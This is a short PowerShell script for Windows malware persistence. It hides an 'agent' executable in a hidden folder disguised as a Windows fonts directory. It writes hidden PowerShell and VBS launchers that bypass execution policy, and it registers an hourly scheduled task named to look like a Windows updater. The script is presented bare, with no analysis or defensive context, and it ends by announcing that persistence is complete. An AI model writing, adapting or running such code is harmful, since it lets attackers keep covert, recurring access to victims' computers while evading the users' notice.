$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'Stop'

$agentPath = $env:AgentPath
if (-not $agentPath -or -not (Test-Path -LiteralPath $agentPath)) {
    Write-Output "ERROR: AgentPath not set or file missing: '$agentPath'"
    exit 1
}

# Hidden folder
$hideDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $hideDir)) {
    New-Item -ItemType Directory -Path $hideDir -Force | Out-Null
    attrib +h $hideDir
    Write-Output "[+] Created $hideDir"
}

# Copy agent (force overwrite)
$agentFile = "$hideDir\agent.exe"
try {
    Copy-Item -LiteralPath $agentPath -Destination $agentFile -Force -ErrorAction Stop
    attrib +h $agentFile
    Write-Output "[+] Copied agent ($((Get-Item $agentFile).Length) bytes)"
} catch {
    Write-Output "ERROR: Copy failed: $_"
    exit 1
}

# Launchers
$launcherPath = "$hideDir\run.ps1"
@"
`$ProgressPreference = 'SilentlyContinue'
Start-Process -WindowStyle Hidden -FilePath '$agentFile'
"@ | Set-Content -Path $launcherPath -Encoding ASCII -Force
attrib +h $launcherPath

$vbsPath = "$hideDir\run.vbs"
@"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
"@ | Set-Content -Path $vbsPath -Encoding ASCII -Force
attrib +h $vbsPath

# Scheduled task every 1 hour
$taskName = "WindowsUpdaterTaskHourly"
schtasks /delete /tn $taskName /f 2>$null
schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it
if ($LASTEXITCODE -eq 0) {
    Write-Output "✅ Task created (every 1 hour)"
    schtasks /run /tn $taskName 2>$null
    Write-Output "✅ Agent launched"
} else {
    Write-Output "❌ Task creation failed, exit code $LASTEXITCODE"
    exit 1
}

Write-Output "✅ Persistence complete – agent runs every hour from hidden folder"
